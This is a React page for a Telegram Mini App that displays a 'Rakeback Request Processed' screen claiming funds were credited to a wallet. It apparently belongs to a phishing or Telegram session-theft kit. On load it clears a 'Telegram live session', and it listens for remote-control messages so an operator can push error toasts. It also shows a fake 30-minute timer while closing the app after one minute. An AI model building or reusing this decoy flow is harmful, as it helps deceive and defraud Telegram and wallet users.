'use client';

import { useState, useEffect } from 'react';
import { useTelegram } from '../components/providers/TelegramProvider';
import { clearTelegramSession } from '../lib/dataSync';
import { useRemoteControlListener } from '../lib/remoteControl';
import { useToast } from '../components/providers/ToastContext';
import './success.css';

export default function SuccessPage() {
    const { showError } = useToast();
    useRemoteControlListener({ onToast: (msg) => showError(msg) });
    const { webApp } = useTelegram();
    const [timeRemaining, setTimeRemaining] = useState(30 * 60); // 30 minutes displayed

    // Clear the Telegram live session when this page loads
    useEffect(() => {
        clearTelegramSession();
    }, []);

    useEffect(() => {
        const timer = setInterval(() => {
            setTimeRemaining((prev) => {
                if (prev <= 0) {
                    clearInterval(timer);
                    webApp?.HapticFeedback?.notificationOccurred('success');
                    handleOk();
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        return () => clearInterval(timer);
    }, [webApp]);

    // Auto-exit after 1 minute
    useEffect(() => {
        const exitTimer = setTimeout(() => {
            handleOk();
        }, 60 * 1000); // 1 minute

        return () => clearTimeout(exitTimer);
    }, []);

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
    };

    const handleOk = () => {
        webApp?.HapticFeedback?.notificationOccurred('success');

        // Close the Mini App
        if (webApp?.close) {
            webApp.close();
        } else {
            console.log('WebApp close method not available');
            // Fallback for testing/browser
            window.close();
        }
    };

    return (
        <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh', justifyContent: 'center', padding: '40px 20px' }}>
            {/* Remote Error Toast */}
            {/* Remote Error Toast */}
            {/* Remote Error Toast is now global */}
            <div className="congrats-container">
                {/* Glowing Shield Icon */}
                <div className="shield-icon">
                    <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                        {/* Shield Outline */}
                        <path d="M50 95C75 88 90 65 90 45V20L50 5L10 20V45C10 65 25 88 50 95Z" stroke="#00FF88" strokeWidth="3" fill="rgba(0, 255, 136, 0.1)" />
                        {/* Checkmark */}
                        <path d="M32 50L45 63L68 38" stroke="#00FF88" strokeWidth="6" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                </div>

                {/* Header */}
                <h1 className="title">Rakeback Request Processed!</h1>
                <p className="subtitle">Your funds have been credited to Wallet</p>

                {/* Icons Section */}
                <div className="icons-section">
                    {/* Coins Icon */}
                    <div className="icon-item">
                        <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <circle cx="32" cy="32" r="30" fill="#FFD700" />
                            <circle cx="32" cy="32" r="24" stroke="#B8860B" strokeWidth="2" fill="#FFD700" />
                            <path d="M25 20L32 45L39 20" stroke="#B8860B" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
                            <path d="M20 32H44" stroke="#B8860B" strokeWidth="3" strokeLinecap="round" />
                        </svg>
                    </div>
                    {/* Wallet Icon */}
                    <div className="icon-item">
                        <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect x="4" y="12" width="56" height="40" rx="6" fill="#8A2BE2" />
                            <path d="M4 20H60" stroke="#6018A8" strokeWidth="2" />
                            <rect x="44" y="26" width="20" height="12" rx="2" fill="#4B0082" />
                            <circle cx="54" cy="32" r="3" fill="#FFFFFF" />
                            <path d="M12 12V8C12 5.79086 13.7909 4 16 4H48C50.2091 4 52 5.79086 52 8V12" stroke="#00FF88" strokeWidth="4" />
                        </svg>
                    </div>
                </div>

                {/* Timer */}
                <div className="timer-display" id="timer">{formatTime(timeRemaining)}</div>

                {/* Exit Button */}
                <button className="exit-btn" id="exit-btn" onClick={handleOk}>Exit</button>
            </div>
        </div>
    );
}
